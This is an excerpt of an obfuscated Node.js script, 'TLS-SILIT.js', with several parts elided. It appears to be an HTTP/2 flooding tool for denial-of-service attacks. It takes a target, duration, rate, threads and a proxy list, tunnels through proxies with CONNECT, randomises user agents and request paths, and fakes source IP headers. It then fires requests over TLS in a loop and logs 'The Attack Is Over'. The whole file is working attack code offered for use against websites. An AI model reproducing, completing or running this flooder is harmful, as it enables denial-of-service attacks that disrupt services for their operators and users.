...
process.on('uncaughtException', function (_0x1cb037) {})
process.argv.length < 7 &&
    (console.log('\nBIKS \n'),
        console.log('node TLS-SILIT.js [TARGET] [TIME] [RATE] [THREAD] [PROXY]'),
        process.exit())
const headers = {}
function readLines(_0x9aab8b) {
    return fs.readFileSync(_0x9aab8b, 'utf-8').toString().split(/\r?\n/)
}
const getCurrentTime = () => {
        const _0x1307de = new Date(),
            _0x48ca50 = _0x1307de.getHours().toString().padStart(2, '0'),
            _0x542d23 = _0x1307de.getMinutes().toString().padStart(2, '0'),
            _0x4d54d8 = _0x1307de.getSeconds().toString().padStart(2, '0')
        return (
            '(\x1B[34m' + _0x48ca50 + ':' + _0x542d23 + ':' + _0x4d54d8 + '\x1B[0m)'
        )
    },
...
function getStatus() {
    const _0x349ba1 = new Promise((_0x1b8af2, _0x4ede74) => {
            setTimeout(() => {
                _0x4ede74(new Error('Request timed out'))
            }, 5000)
        }),
        _0x3c8c71 = axios.get(targetURL, {
            httpsAgent: agent
        })
    Promise.race([_0x3c8c71, _0x349ba1])
        .then((_0x169fef) => {
            const {
                status: _0x508cc9,
                data: _0x3a9fca
            ...
            console.log(
                '[\x1B[35mSYSTEM\x1B[0m] ' +
                getCurrentTime() +
                ' Title: ' +
                getTitleFromHTML(_0x3a9fca) +
                ' (\x1B[32m' +
                _0x508cc9 +
                '\x1B[0m)'
            )
        ...
        .catch((_0x1d09d2) => {
            if (_0x1d09d2.message === 'Request timed out') {
                console.log(
                    '[\x1B[35mSYSTEM\x1B[0m] ' + getCurrentTime() + ' Request Timed Out'
                )
            } else {
                if (_0x1d09d2.response) {
                    const _0x4d4812 = getTitleFromHTML(_0x1d09d2.response.data)
                    console.log(
                        '[\x1B[35mSYSTEM\x1B[0m] ' +
                        getCurrentTime() +
                        ' Title: ' +
...
function getTitleFromHTML(_0x12ec6b) {
    const _0x4d0af3 = _0x12ec6b.match(/<title>(.*?)<\/title>/i)
    if (_0x4d0af3 && _0x4d0af3[1]) {
        return _0x4d0af3[1]
    }
    return 'Not Found'
}
function randomIntn(_0x208ad4, _0x587940) {
    return Math.floor(Math.random() * (_0x587940 - _0x208ad4) + _0x208ad4)
}
function getRandomNumberBetween(_0x3a8501, _0x2162ef) {
    return Math.floor(Math.random() * (_0x2162ef - _0x3a8501 + 1) + _0x3a8501)
}
function randomString(_0x4cff11) {
    var _0x20be44 = '',
        _0x2549b3 =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
        _0xc077d0 = _0x2549b3.length
    for (var _0x559b45 = 0; _0x559b45 < _0x4cff11; _0x559b45++) {
        _0x20be44 += _0x2549b3.charAt(Math.floor(Math.random() * _0xc077d0))
    }
    return _0x20be44
}
function randomElement(_0x29f7ef) {
    return _0x29f7ef[randomIntn(0, _0x29f7ef.length)]
}
const args = {
...
if (cluster.isMaster) {
    ...
    setTimeout(() => {
        console.log(
            '[\x1B[35mINFO\x1B[0m] ' + getCurrentTime() + ' The Attack Is Over'
        )
        process.exit(1)
    }, process.argv[3] * 1000)
}
...
const Methods = [
    ...
    randomMethod = Methods[Math.floor(Math.random() * Methods.length)],
    queryStrings = ['&', '='],
    pathts = [
        '/',
        '?page=1',
...
const uap = [
    ...
    ip_spoof = () => {
        ...
        return (
            _0x2005cc() + '.' + _0x2005cc() + '.' + _0x2005cc() + '.' + _0x2005cc()
        )
    }
...
class NetSocket {
    constructor() {}
        ['HTTP'](_0x33b1ea, _0x40c2a4) {
            const _0x4ae545 = _0x33b1ea.address.split(':'),
                _0x367f05 = _0x4ae545[0],
                _0x424523 =
                'CONNECT ' +
                _0x33b1ea.address +
                ':443 HTTP/1.1\r\nHost: ' +
                ...
                _0x2adbf0 = new Buffer.from(_0x424523),
                _0x16b048 = net.connect({
                    host: _0x33b1ea.host,
                    port: _0x33b1ea.port,
                })
            _0x16b048.setTimeout(_0x33b1ea.timeout * 10000)
            _0x16b048.setKeepAlive(true, 100000)
            _0x16b048.on('connect', () => {
                _0x16b048.write(_0x2adbf0)
            })
            _0x16b048.on('data', (_0x1782b2) => {
                const _0x5d3557 = _0x1782b2.toString('utf-8'),
                    _0x11459d = _0x5d3557.includes('HTTP/1.1 200')
                if (_0x11459d === false) {
                    return (
                        _0x16b048.destroy(),
                        _0x40c2a4(undefined, 'error: invalid response from proxy server')
                    )
                }
                return _0x40c2a4(_0x16b048, undefined)
            })
            _0x16b048.on('timeout', () => {
                return (
                    _0x16b048.destroy(), _0x40c2a4(undefined, 'error: timeout exceeded')
                )
            })
            _0x16b048.on('error', (_0x445bf8) => {
                return _0x16b048.destroy(), _0x40c2a4(undefined, 'error: ' + _0x445bf8)
            })
        }
}
...
function runFlooder() {
    const _0x462171 = randomElement(proxies),
        _0x2ab2a6 = _0x462171.split(':'),
        _0x3fae14 = new UserAgent()
    var _0x4c6efc = uap[Math.floor(Math.floor(Math.random() * uap.length))]
    headers[':authority'] = parsedTarget.host
    headers['user-agent'] = _0x4c6efc
    const _0x1f3069 = {
        host: _0x2ab2a6[0],
        port: ~~_0x2ab2a6[1],
    ...
    process.on('uncaughtException', function (_0x53bdbd) {})
    process.on('unhandledRejection', function (_0x277f4d) {})
    Socker.HTTP(_0x1f3069, (_0x136721, _0x1590c9) => {
        if (_0x1590c9) {
            return
        }
        _0x136721.setKeepAlive(true, 900000)
        const _0x1c1c28 = {
                ALPNProtocols: ['h2'],
            ...
            _0x2f3edd = tls.connect(443, parsedTarget.host, _0x1c1c28)
        _0x2f3edd.setKeepAlive(true, 600000)
        const _0x546b47 = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: {
        ...
        _0x546b47.on('connect', () => {
            const _0x200b9e = setInterval(() => {
                for (let _0x2fb2cd = 0; _0x2fb2cd < args.Rate; _0x2fb2cd++) {
                    const _0x5f5d9 = _0x546b47
                        .request(headers)
                        .on('response', (_0x366765) => {
                            _0x5f5d9.close()
                            _0x5f5d9.destroy()
                            return
                        })
